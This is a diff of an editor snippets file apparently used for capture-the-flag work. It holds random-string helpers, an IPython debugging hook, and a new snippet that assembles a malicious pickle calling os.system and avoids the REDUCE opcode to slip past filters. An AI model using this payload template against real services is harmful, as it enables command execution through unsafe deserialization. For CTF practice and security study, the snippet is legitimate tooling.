@@ -1,30 +1,50 @@
 {
-	"web template": {
+	"ctf helpers": {
 		"scope": "python",
 		"prefix": "ctf helpers",
 		"body": [
-            "import random",
-            "import string",
-            "",
+			"import random",
+			"import string",
+			"",
 			"def rand_str(k=10) -> str:",
-            "    return ''.join(random.choices(string.ascii_letters + string.digits, k=k))",
-            "",
-            "def rand_email() -> str:",
-            "    return f'{rand_str(10)}@{rand_str(5)}.com'",
-            "",
+			"    return ''.join(random.choices(string.ascii_letters + string.digits, k=k))",
+			"",
+			"def rand_email() -> str:",
+			"    return f'{rand_str(10)}@{rand_str(5)}.com'",
+			""
 		]
 	},
-    "hook": {
-        "scope": "python",
-        "prefix": "hook",
-        "body": [
-            "def hook(l=None):",
-            "    if l:",
-            "        locals().update(l)",
-            "    import IPython",
-            "    IPython.embed(banner1='', confirm_exit=False)",
-            "    exit(0)",
-            "",
-        ]
-    },
+	"hook": {
+		"scope": "python",
+		"prefix": "hook",
+		"body": [
+			"def hook(l=None):",
+			"    if l:",
+			"        locals().update(l)",
+			"    import IPython",
+			"    IPython.embed(banner1='', confirm_exit=False)",
+			"    exit(0)",
+			""
+		]
+	},
+	"pickle python": {
+		"scope": "python",
+		"prefix": "pickle python",
+		"body": [
+			"from pickleassem import PickleAssembler",
+			"import pickletools",
+			"import base64",
+			"",
+			"pa = PickleAssembler(proto=4)",
+			"pa.push_mark()",
+			"pa.util_push('ls')",
+			"pa.build_inst('os', 'system')",
+			"payload = pa.assemble()",
+			"assert b'R' not in payload",
+			"print(payload)",
+			"b64_payload =base64.b64encode(payload).decode()",
+			"print(b64_payload)",
+			"pickletools.dis(payload, annotate=1)"
+		]
+	}
 }
